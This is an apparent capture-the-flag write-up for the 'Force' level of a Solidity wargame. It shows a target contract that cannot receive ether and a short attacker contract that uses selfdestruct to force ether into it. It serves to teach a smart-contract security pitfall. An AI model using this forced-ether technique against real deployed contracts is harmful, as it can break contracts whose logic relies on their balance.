# Force

The goal of this level is to make the balance of the contract greater than zero.

First, without `payable` modifier, any function cannot deal the payment, it will false them and refund them back.

```javascript
pragma solidity ^0.4.18;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Obviously, this contract will never take your money, except someone destroy itself to force feed its 
heritage.

Simply deploy a contract and deposit some ether, than trigger the `selfdestruct()` function with target instance address.

```javascript
pragma solidity ^0.4.18;
contract forceFeeder{
    function () public payable{

    }
    function feeder(address param) public{ /*param Is Your Zepplin Main Contract Address*/
        selfdestruct(param);
    }
}
```